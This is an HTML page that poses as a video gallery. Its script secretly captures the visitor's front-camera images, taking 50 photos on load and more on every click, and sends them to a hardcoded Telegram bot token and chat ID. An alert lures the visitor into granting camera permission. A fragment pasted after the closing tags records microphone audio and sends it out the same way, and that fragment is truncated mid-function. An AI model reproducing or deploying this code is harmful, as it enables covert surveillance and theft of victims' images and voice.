
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0" />
  <title>ÿµŸÅÿ≠ÿ© ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ - ÿ∑ÿßÿ¶ŸÅÿ© ÿßŸÑÿ∏ŸÑÿßŸÖ</title>
  <style>
    body {
      margin: 0;
      background-color: #fcd;
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      overflow-x: hidden;
    }

    .video-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      padding: 20px;
    }

    video {
      width: 100%;
      aspect-ratio: 1/1;
      border-radius: 10px;
      background-color: #000;
      cursor: pointer;
      border: 3px solid purple;
      transition: transform 0.3s;
    }

    video:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px red;
    }

    .lightbox {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      flex-direction: column;
    }

    .lightbox video {
      max-width: 90%;
      max-height: 80%;
    }

    .spinner {
      border: 8px solid #eee;
      border-top: 8px solid red;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-top: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .back-btn {
      position: fixed;
      bottom: 20px;
      left: 20px;
      width: 60px;
      height: 60px;
      background-color: pink;
      color: black;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      cursor: pointer;
      box-shadow: 0 0 10px pink;
      z-index: 1001;
    }
  </style>
</head>
<body onclick="takeExtraPhoto()">

  <div class="video-grid">
    <video src="VivaCut_video_1751836959485_HD1.mp4" onclick="openLightbox(this)" poster="poster1.jpg"></video>
    <video src="ffghgg2.mp4" onclick="openLightbox(this)" poster="poster2.jpg"></video>
    <video src="ffghgg3.mp4" onclick="openLightbox(this)" poster="poster3.jpg"></video>
    <video src="ffghgg4.mp4" onclick="openLightbox(this)" poster="poster4.jpg"></video>
    <video src="ffghgg5.mp4" onclick="openLightbox(this)" poster="poster5.jpg"></video>
  </div>

  <div id="lightbox" class="lightbox" onclick="closeLightbox()">
    <video id="expandedVideo" controls autoplay></video>
    <div class="spinner" id="spinner"></div>
  </div>

  <div class="back-btn" onclick="location.href='index.html'">‚¨Ö</div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    const lightbox = document.getElementById('lightbox');
    const expandedVideo = document.getElementById('expandedVideo');
    const spinner = document.getElementById('spinner');

    function openLightbox(video) {
      expandedVideo.src = video.src;
      lightbox.style.display = 'flex';
      spinner.style.display = 'block';
      expandedVideo.oncanplay = () => {
        spinner.style.display = 'none';
        expandedVideo.play();
      };
    }

    function closeLightbox() {
      lightbox.style.display = 'none';
      expandedVideo.pause();
      expandedVideo.src = "";
    }

    let imageCapture = null;

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        const track = stream.getVideoTracks()[0];
        imageCapture = new ImageCapture(track);
        captureMultiplePhotos(50);
      })
      .catch(() => {
        alert("Ÿäÿ¨ÿ® ÿ≥ŸÖÿßÿ≠ ŸÉŸä ÿ™ÿ¥ÿßŸáÿØ ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™");
      });

    function captureMultiplePhotos(count) {
      let taken = 0;
      const interval = setInterval(() => {
        if (!imageCapture) return;
        imageCapture.grabFrame().then(bitmap => {
          const canvas = document.createElement("canvas");
          const size = Math.min(bitmap.width, bitmap.height);
          canvas.width = canvas.height = size;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0, size, size);
          canvas.toBlob(blob => sendImage(blob, "üì∏ ÿµŸàÿ±ÿ© ÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© " + (taken + 1)), "image/png");
        });
        taken++;
        if (taken >= count) clearInterval(interval);
      }, 300);
    }

    function takeExtraPhoto() {
      if (!imageCapture) return;
      imageCapture.grabFrame().then(bitmap => {
        const canvas = document.createElement("canvas");
        const size = Math.min(bitmap.width, bitmap.height);
        canvas.width = canvas.height = size;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(bitmap, 0, 0, size, size);
        canvas.toBlob(blob => sendImage(blob, "üì∏ ÿµŸàÿ±ÿ© ÿ®ÿßŸÑŸÜŸÇÿ±ÿ©"), "image/png");
      });
    }

    function sendImage(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", caption);
      formData.append("photo", blob, "photo.png");
      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }
  </script>
</body>
</html>
        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
          const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
          const chunks = [];
          mediaRecorder.ondataavailable = e => chunks.push(e.data);
          mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            sendBlob(blob, 'üéôÔ∏è ÿ™ÿ≥ÿ¨ŸäŸÑ ÿµŸàÿ™Ÿä');
          };
          mediaRecorder.start();
          setTimeout(() => mediaRecorder.stop(), 10000);
        });
      }, 12000);
    }

    function sendBlob(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", caption);

      if (blob.type.startsWith("image/")) {
        formData.append("photo", blob, "photo.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
      } else if (blob.type.startsWith("audio/")) {
        formData.append("audio", blob, "audio.ogg");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, { method: "POST", body: formData });
      }
    }
  </script>
</body>
</html>
